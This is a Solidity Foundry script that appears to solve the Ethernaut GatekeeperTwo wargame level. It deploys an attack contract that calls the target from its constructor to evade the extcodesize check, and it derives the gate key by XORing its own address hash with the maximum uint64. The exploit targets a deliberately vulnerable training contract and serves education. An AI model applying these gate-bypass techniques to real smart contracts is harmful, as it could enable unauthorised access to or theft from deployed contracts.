// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "@forge-std/Script.sol";

contract Attack {
    GatekeeperTwo public g2Contract;

    constructor(address g2) {
        g2Contract = GatekeeperTwo(g2);
        uint64 pass = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        g2Contract.enter(bytes8(pass));
    }
}

contract GatekeeperTwoScript is Script {

    GatekeeperTwo public g2contract;
    function setUp() public {
        g2contract = GatekeeperTwo(payable(vm.envAddress("GATEKEEPERTWO_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(g2contract));
        vm.stopBroadcast();
    }
}